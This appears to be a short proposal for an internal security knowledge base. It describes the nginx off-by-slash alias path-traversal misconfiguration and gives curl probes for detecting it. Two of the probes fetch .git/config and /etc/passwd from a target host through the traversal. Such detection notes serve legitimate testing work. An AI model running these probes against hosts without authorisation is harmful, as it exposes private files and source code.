# PROPOSAL (proposal) for docs/knowledge/tech-nginx.md — detect-tune 2026-06-30
_Review and apply manually; not auto-merged into the KB._

## Off-by-Slash Alias Traversal

**Vulnerability pattern:** `location /static { alias /srv/static/; }` — missing trailing slash on `location` block. Nginx concatenates the URI suffix directly, enabling `../` traversal one level up.

**Probe (on-demand, add to `recon-params crawl-host` post-crawl):**
```bash
# Detect traversal
curl -s -o /dev/null -w "%{http_code}" "https://<host>/static../"
# 200 (same as /static/) → vulnerable; try:
curl "https://<host>/static../.git/config"
curl "https://<host>/static../etc/passwd"
